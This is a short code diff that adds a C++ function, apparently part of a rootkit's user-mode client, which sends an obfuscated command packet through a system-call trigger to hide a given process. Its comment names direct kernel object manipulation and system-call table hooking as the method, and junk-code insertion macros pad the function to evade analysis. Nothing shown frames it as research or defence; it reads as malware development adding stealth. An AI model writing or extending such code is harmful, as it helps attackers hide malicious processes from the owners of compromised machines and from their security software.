@@ -307,6 +307,32 @@ bool GhostHandshake() {
     return (status == 0);
 }
 
+// Ghost process (DKOM + SSDT hook)
+bool GhostProcessGhosting(uint32_t processId) {
+    INSERT_JUNK();
+    
+    MUTATED_PACKET packet;
+    InitializePacket(&packet);
+    
+    INSERT_JUNK();
+    
+    packet.CommandID = DynamicCommand::GhostProcess();
+    packet.ProcessId = processId;
+    packet.Flags = PACKET_FLAG_EXCEPTION_SAFE;
+    
+    INSERT_JUNK();
+    
+    FinalizePacket(&packet);
+    
+    INSERT_JUNK();
+    
+    NTSTATUS status = SyscallTrigger(&packet);
+    
+    INSERT_JUNK();
+    
+    return (status == 0 && packet.Status == 0);
+}
+
 /*
  * ═══════════════════════════════════════════════════════════════════════════
  * PROCESS UTILITIES
